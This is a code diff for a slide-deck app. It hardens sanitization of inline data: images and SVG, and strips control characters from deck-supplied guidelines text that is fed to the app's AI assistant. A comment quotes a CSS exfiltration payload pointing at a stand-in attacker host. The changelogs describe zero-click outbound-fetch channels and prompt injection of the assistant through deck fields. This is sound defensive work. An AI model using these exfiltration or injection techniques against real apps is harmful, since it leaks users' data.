@@ -69,8 +69,9 @@ const velaClipboardReadSlide = async () => {
   return null;
 };
 
-const VELA_VERSION = "12.63";
+const VELA_VERSION = "12.64";
 const VELA_CHANGELOG = [
+  { v: "12.64", d: "Security (defense-in-depth, audit follow-up): inline data: images (image-block src, slide background image, branding logo) are now sanitized consistently — raster types pass through, SVG data: images are routed through the same SVG sanitizer the svg block uses, and non-image data: types are dropped (the logo no longer accepts arbitrary data: MIME types). Deck-supplied prompt-guidelines text is stripped of control/bidi/format characters before it reaches the engine. Local server (serve.py) deck-name validation normalizes Unicode and rejects bidi/format controls and separator/dot lookalikes (anti-spoofing; the path containment check was already in place). Added regression coverage." },
   { v: "12.63", d: "Security (defense-in-depth): the local dev server (serve.py) now sends a Content-Security-Policy header. The hosted artifact runs sandboxed with its own CSP; the local server had none, leaving the client sanitizer as the only egress control. The policy constrains image and connection egress to same-origin and inline data (no external network requests on render) while still permitting the in-browser build toolchain. No deck or engine behavior change." },
   { v: "12.62", d: "Security (audit 2026-06, follow-up to v12.59/12.61): close a residual zero-click outbound-fetch channel in the SVG sanitizer. Deck-supplied SVG markup is sanitized as SVG but later rendered into an HTML context, where a sanitized fragment could be re-parsed under HTML rules and an image element treated as an HTML image with a fetching attribute — a different surface from the href/CSS holes already closed. The sanitizer now strips the relevant image-source attributes and guarantees the output stays in SVG scope, so the same content can never be reinterpreted as a network-loading HTML element. Decks still load nothing external. Added a jsdom round-trip regression battery and a CI source guard." },
   { v: "12.61", d: "Security (audit 2026-06, follow-up to v12.59): close a CSS auto-load exfil channel on the slide/block color surface. Slide and block background/color scalars (e.g. bg, bgGradient, color, accent, border, the per-block color fields, and grid cell backgrounds) were written straight into inline CSS at render without the value filter that already covered the block style object, so a deck-supplied value could fire a zero-click outbound request on render — same class as the SVG/img holes, different surface. These fields are now scrubbed at import with a function-name-agnostic reject (no url()/quoted-source function/bare scheme), preserving legitimate colors and gradients; the undocumented slide background-image field is clamped to inline data:image/* like the image block. Decks still load nothing external. Added jsdom round-trip + CI source guards and in-browser regression cases." },
@@ -536,6 +537,30 @@ function sanitizeSvgMarkup(raw) {
   } catch (_) { return ""; }
 }
 
+// Inline data: images for image-block src / slide bgImage / branding logo.
+// Raster types are inert in an <img>. data:image/svg+xml is LIVE SVG — the same
+// markup the dedicated svg block routes through sanitizeSvgMarkup — so it gets
+// the identical decode -> sanitize -> re-encode treatment here rather than
+// relying on the browser's <img> SVG sandbox (the only thing that stops a deck
+// SVG's external <image>/<style url()> from firing in a non-sandboxed context
+// such as the local dev server / a desktop webview). Non-image data: types are
+// dropped (a stricter, consistent allowlist than the prior data:-only logo rule).
+const SAFE_RASTER_DATA_IMAGE = /^data:image\/(png|jpe?g|gif|webp|avif|bmp)[;,]/i;
+function sanitizeImageDataUri(s) {
+  if (typeof s !== "string" || !s) return "";
+  if (SAFE_RASTER_DATA_IMAGE.test(s)) return s;
+  const m = /^data:image\/svg\+xml([^,]*)?,/i.exec(s);
+  if (!m) return "";
+  const meta = m[1] || "";
+  let markup;
+  try {
+    markup = /;base64/i.test(meta) ? atob(s.slice(m[0].length)) : decodeURIComponent(s.slice(m[0].length));
+  } catch (_) { return ""; }
+  const clean = sanitizeSvgMarkup(markup);
+  if (!clean || !/<svg[\s>]/i.test(clean)) return "";
+  return "data:image/svg+xml," + encodeURIComponent(clean);
+}
+
 // SECURITY (audit 2025-05, H2): block.style was previously typecheck-only,
 // which let a deck (or a Vera prompt-injected tool call) ship CSS values
 // like `backgroundImage: url('https://attacker/?d=...')`. Inline styles
@@ -623,8 +648,7 @@ function sanitizeBlock(block) {
   // external, so restrict to inline data:image/* (no network, no data:text/html).
   // Mirrors the branding-logo rule (data:-only). (v12.59)
   if (clean.src && clean.type === "image") {
-    const s = sanitizeUrl(clean.src, ["data:"]);
-    clean.src = /^data:image\//i.test(s) ? s : "";
+    clean.src = sanitizeImageDataUri(sanitizeUrl(clean.src, ["data:"]));
   }
   if (Array.isArray(clean.items)) {
     if (clean.type === "bullets") {
@@ -806,8 +830,8 @@ function sanitizeSlide(slide) {
   // bgImage is a background *image* (auto-fetches on render). Restrict to inline
   // data:image/* — no network — matching the image block / branding-logo rule.
   if ("bgImage" in clean) {
-    const s = typeof clean.bgImage === "string" ? sanitizeUrl(clean.bgImage, ["data:"]) : "";
-    if (/^data:image\//i.test(s)) clean.bgImage = s; else delete clean.bgImage;
+    const s = typeof clean.bgImage === "string" ? sanitizeImageDataUri(sanitizeUrl(clean.bgImage, ["data:"])) : "";
+    if (s) clean.bgImage = s; else delete clean.bgImage;
   }
   return clean;
 }
@@ -850,7 +874,7 @@ function validateAndSanitizeDeck(raw) {
     accentBar: rawBranding.accentBar !== false,
     accentColor: sanitizeString(rawBranding.accentColor || "#3B82F6", 20),
     accentHeight: typeof rawBranding.accentHeight === "number" ? Math.min(rawBranding.accentHeight, 20) : 4,
-    logo: typeof rawBranding.logo === "string" && rawBranding.logo.startsWith("data:") ? rawBranding.logo : null,
+    logo: sanitizeImageDataUri(typeof rawBranding.logo === "string" ? sanitizeUrl(rawBranding.logo, ["data:"]) : "") || null,
     logoPosition: ["top-left", "top-right", "bottom-left", "bottom-right"].includes(rawBranding.logoPosition) ? rawBranding.logoPosition : "top-left",
     logoSize: typeof rawBranding.logoSize === "number" ? Math.min(rawBranding.logoSize, 120) : 56,
     footerLeft: sanitizeString(rawBranding.footerLeft || "", 100),
@@ -864,9 +888,16 @@ function validateAndSanitizeDeck(raw) {
   };
   // Branding color scalars (accentColor, footerBg, footerColor) feed inline CSS;
   // sanitizeString only strips tags/truncates and would pass a short url(...) —
-  // scrub them like every other color field. logo is already data:-only. (v12.61)
+  // scrub them like every other color field. logo is sanitized as an inline
+  // data: image (raster passthrough, svg routed through sanitizeSvgMarkup). (v12.63)
   scrubColorFields(importedBranding);
-  const importedGuidelines = typeof raw.guidelines === "string" ? raw.guidelines.slice(0, 2000) : "";
+  // guidelines is deck-supplied text injected into the Vera system prompt. Strip
+  // control chars (defense-in-depth: no smuggled NUL/bidi/format scaffolding) and
+  // cap length. NOTE: this is not a complete prompt-injection defense — the field
+  // is by design honored by the model; treat third-party decks accordingly.
+  const importedGuidelines = typeof raw.guidelines === "string"
+    ? raw.guidelines.replace(/[\u0000-\u0008\u000b\u000c\u000e-\u001f\u007f-\u009f\u200b-\u200f\u202a-\u202e\u2060-\u2064\u2066-\u206f\ufeff]/g, "").slice(0, 2000)
+    : "";
   return { lanes, guidelines: importedGuidelines, selectedId: null, slideIndex: 0, fullscreen: false, chatOpen: false,
     chatMessages: [{ role: "assistant", content: "Deck imported successfully! Ready to sail. ⛵🖖", ts: now() }],
     chatLoading: false, lastDebug: "", branding: importedBranding };
